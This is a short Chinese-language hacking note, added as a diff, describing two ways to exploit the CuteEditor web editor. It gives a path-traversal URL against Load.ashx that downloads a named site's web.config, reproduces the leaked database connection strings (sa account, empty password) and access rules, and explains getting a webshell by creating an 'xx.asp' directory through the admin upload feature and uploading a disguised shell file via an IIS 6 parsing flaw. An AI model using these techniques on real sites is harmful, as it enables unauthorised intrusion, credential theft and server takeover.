@@ -1,0 +1,78 @@
+cuteeditor编辑器利用方法两则2011-08-26 00:37方法1.直接下载load.ashx配置文件
+
+http://www.badguest.cn /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config
+
+然后查看一些sql配置信息 从sql数据库连接入手
+
+<connectionStrings>
+
+<add name=”ynncConnectionString” connectionString=”Server=.;DataBase=ynta; UID=sa;PWD=”/>
+
+<add name=”strConn” connectionString=”Server=.;DataBase=ynta; UID=sa;PWD=”/>
+
+</connectionStrings>
+
+<location path=”admin/images”>
+
+<system.web>
+
+<authorization>
+
+<allow users=”?” roles=”Admin,Manager,User”/>
+
+</authorization>
+
+</system.web>
+
+</location>
+
+<location path=”admin”>
+
+<system.web>
+
+<authorization>
+
+<deny users=”?” roles=”Admin,Manager,User”/>
+
+<allow users=”*”/>
+
+</authorization>
+
+</system.web>
+
+</location>
+
+<location path=”admin/YNTA_UpFile”>
+
+<system.web>
+
+<authorization>
+
+<allow users=”?” roles=”Admin,Manager,User”/>
+
+</authorization>
+
+</system.web>
+
+</location>
+
+<location path=”admin/flv”>
+
+<system.web>
+
+<authorization>
+
+<allow users=”?” roles=”Admin,Manager,User”/>
+
+</authorization>
+
+</system.web>
+
+</location>
+
+方法2.2003 iis解析(后台拿webshell)
+
+填加新闻–上传音乐，视频等图标—新建目录xx.asp 然后上传小马x.avi
+
+ 
+
